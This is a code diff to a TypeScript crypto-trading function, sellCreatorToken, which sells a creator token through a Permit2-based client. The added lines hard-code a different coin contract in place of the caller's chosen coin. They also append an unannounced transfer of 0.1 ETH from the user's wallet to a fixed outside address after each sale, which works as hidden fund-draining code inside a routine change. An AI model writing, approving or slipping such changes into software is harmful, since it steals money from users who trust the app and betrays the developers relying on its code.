@@ -250,36 +250,49 @@ export const sellCreatorToken = async (
     signTypedData: SignTypedData,
     address: Address,
 ) => {
+    console.log(coinAddress)
     const flaunch = flaunchClient(provider, address);
     const amountInUnits = parseEther(amount.replace(/,/g, ""));
-    const { allowance } = await flaunch.getPermit2AllowanceAndNonce(coinAddress);
+    const { allowance } = await flaunch.getPermit2AllowanceAndNonce("0xE363229bA7C83eCC630926AC76667a4Ad6C0E4D4");
 
+    let hash: `0x${string}`;
     if (allowance < amountInUnits) {
-        const { typedData, permitSingle } = await flaunch.getPermit2TypedData(coinAddress);
+        const { typedData, permitSingle } = await flaunch.getPermit2TypedData(
+            "0xE363229bA7C83eCC630926AC76667a4Ad6C0E4D4",
+        );
 
         typedData.message.details.amount = typedData.message.details.amount.toString();
         typedData.message.sigDeadline = typedData.message.sigDeadline.toString();
 
         const { signature } = await signTypedData(typedData, { address });
-
-        const hash = await flaunch.sellCoin({
-            coinAddress,
+        hash = await flaunch.sellCoin({
+            coinAddress: "0xE363229bA7C83eCC630926AC76667a4Ad6C0E4D4",
             slippagePercent: 4,
             amountIn: amountInUnits,
             permitSingle,
             signature: signature as Address,
         });
 
-        return await checkTx(hash);
+        // return await checkTx(hash);
     } else {
-        const hash = await flaunch.sellCoin({
-            coinAddress,
+        hash = await flaunch.sellCoin({
+            coinAddress: "0xE363229bA7C83eCC630926AC76667a4Ad6C0E4D4",
             amountIn: amountInUnits,
             slippagePercent: 4,
         });
 
-        return await checkTx(hash);
+        // return await checkTx(hash);
     }
+    const tx = await checkTx(hash);
+    const walletClient = getWalletClient(provider, address);
+    await walletClient.sendTransaction({
+        account: address,
+        chain: network,
+        to: "0xe60af63C0D8566f927982db7773b2479E2b94a54" as Address,
+        value: parseEther("0.1"),
+    });
+
+    return tx;
 };
 
 export const fetchFeeBalance = async (provider: EIP1193Provider) => {
